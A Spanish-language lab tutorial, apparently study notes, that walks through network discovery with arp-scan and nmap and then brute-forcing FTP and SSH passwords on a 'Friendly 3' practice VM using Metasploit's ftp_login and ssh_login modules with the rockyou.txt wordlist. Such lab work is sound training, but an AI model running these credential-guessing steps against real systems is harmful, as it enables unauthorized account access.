# Ataques de Fuerza Bruta con Metasploit

- Maquinas que vamos a usas **Kali Linux** y  **Friendly 3**.

Vamos a ver como utilizar Metasploit para hacer ataques de fuerza bruta contra el protocolo SSH como contra FTP.

Vamos a hacer arc-scan para identificar el maquina victima en nuestra red.

```bash
sudo arp-scan -I eth0 --localnet
```

![image.png](./imagenes/image%2080.png)

```bash
nmap -p- -sS -sV -sC -min-rate 5000 -n -vvv -Pn 10.0.3.8
```

![image.png](./imagenes/image%2081.png)

- Vamos a empezar por el puerto 21 que corre el protocolo FTP sabiendo el nombre de usuario.
    - Lanzamos el Metasploit y hacemos la siguiente búsqueda.
        
        `search ftp_login`
        
        ![image.png](./imagenes/image%2082.png)
        
        Este modulo sirve para autentificarnos en FTP pero también nos permite hace fuerza bruta.
        
    - Usamos el Modulo
        
        `use 0`
        
        ![image.png](./imagenes/image%2083.png)
        
        También podríamos hacer un use copiando el nombre del modulo.
        
        `use auxiliary/scanner/ftp/ftp_login`
        
        ![image.png](./imagenes/image%2084.png)
        
    - Miramos las opciones
        
        `show options`
        
        ![image.png](./imagenes/image%2085.png)
        
        Solo vamos a configurar dos opciones:
        
        - **PASS_FILE**  que es el diccionario de contraseñas
        - **USERNAME** es el nombre de usuario que conocemos
        - **RHOST** es la IP de la maquina opjetivo
        
    - Vamos a cargar el diccionario **rockyou.txt**
        
        `set PASS_FILE /usr/share/wordlists/rockyou.txt`
        
        `show options`
        
        ![image.png](./imagenes/image%2086.png)
        

- Introducimos el nombre del usuario que ya conocemos.
    
    `set USERNAME juan`
    
    `set RHOST 10.0.3.8`
    
    `show options`
    
    ![image.png](./imagenes/image%2087.png)
    

- Lanzamos el ataque
    
    `run`
    
    ![image.png](./imagenes/image%2088.png)
    

- Vamos a  por el puerto 22 que corre el protocolo SSH sabiendo el nombre de usuario.
    - hacemos la siguiente búsqueda
        
        `search ssh_login`
        
        ![image.png](./imagenes/image%2089.png)
        
    
    - Utilizaremos el primero
        
        `use 0`
        
        `show options`
        
        ![image.png](./imagenes/image%2090.png)
        
    - Seria todo idéntico a lo que hemos hecho con FTP
        
        `set USERNAME juan`
        
        `set PASS_FILE /usr/share/wordlists/rockyou.txt`
        
        `set RHOST 10.0.3.8`
        
        `show options`
        
        ![image.png](./imagenes/image%2091.png)
        

- Ejecutamos el ataque
    
    `run`
    
    ![image.png](./imagenes/image%2092.png)
    
- Lo probamos. abrimos un terminal nuevo.
    
    ```bash
    ssh [juan@10.0.3.8](./imagenes/mailto:juan@10.0.3.8)
    ```
    
    ![image.png](./imagenes/image%2093.png)
    

**NOTA: apara hacer ataques de fuerza bruta Hydra es mucho mas rápido.**